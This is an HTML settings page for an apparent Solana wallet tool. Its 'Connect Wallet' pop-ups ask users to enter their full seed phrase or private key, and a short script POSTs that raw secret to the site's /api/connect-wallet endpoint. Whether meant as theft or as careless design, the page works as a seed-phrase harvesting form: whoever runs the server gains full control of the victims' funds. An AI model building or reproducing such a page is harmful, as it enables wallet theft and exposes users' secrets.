<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <h1>⚙️ Settings</h1>

    <!-- 🔘 Bottom-Aligned Buttons -->
    <div class="bottom-nav">
        <button class="button" onclick="showPopup('walletPopup')">Connect Wallet</button>
        <button class="button" onclick="disconnectWallet()">Disconnect Wallet</button>
        <button class="button">Balance: 0.000 SOL</button>
    </div>

    <!-- 📢 Connect Wallet Pop-up -->
    <div id="walletPopup" class="popup">
        <h2>🔗 Connect Wallet</h2>
        <button class="button small" onclick="showPopup('seedPopup')">Use Seed Phrase</button>
        <button class="button small" onclick="showPopup('privateKeyPopup')">Use Private Key</button>
        <button class="close-btn" onclick="closePopup('walletPopup')">Close</button>
    </div>

    <!-- 🔑 Seed Phrase Input Pop-up -->
    <div id="seedPopup" class="popup">
        <h2>🌱 Enter Seed Phrase</h2>
        <textarea id="seedPhrase" placeholder="Enter your 12 or 24-word seed phrase"></textarea>
        <button class="button small" onclick="saveWallet('seedPhrase')">Save</button>
        <button class="close-btn" onclick="closePopup('seedPopup')">Close</button>
    </div>

    <!-- 🔑 Private Key Input Pop-up -->
    <div id="privateKeyPopup" class="popup">
        <h2>🔑 Enter Private Key</h2>
        <input type="text" id="privateKey" placeholder="Enter your private key">
        <button class="button small" onclick="saveWallet('privateKey')">Save</button>
        <button class="close-btn" onclick="closePopup('privateKeyPopup')">Close</button>
    </div>

    <!-- 📌 JavaScript for Pop-ups & Wallet Handling -->
    <script>
        function showPopup(id) {
            document.getElementById(id).classList.add("show");
        }

        function closePopup(id) {
            document.getElementById(id).classList.remove("show");
        }

        function saveWallet(type) {
            const data = type === "seedPhrase" ? document.getElementById("seedPhrase").value : document.getElementById("privateKey").value;
            
            if (!data) {
                alert("⚠️ Please enter your " + (type === "seedPhrase" ? "seed phrase." : "private key."));
                return;
            }

            fetch("/api/connect-wallet", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ [type]: data })
            })
            .then(res => res.json())
            .then(response => {
                alert(response.message);
                closePopup(type === "seedPhrase" ? "seedPopup" : "privateKeyPopup");
            })
            .catch(error => console.error("❌ Error:", error));
        }

        function disconnectWallet() {
            fetch("/api/disconnect-wallet", { method: "DELETE" })
            .then(() => alert("✅ Wallet disconnected!"))
            .catch(error => console.error("❌ Error:", error));
        }
    </script>
</body>
</html>
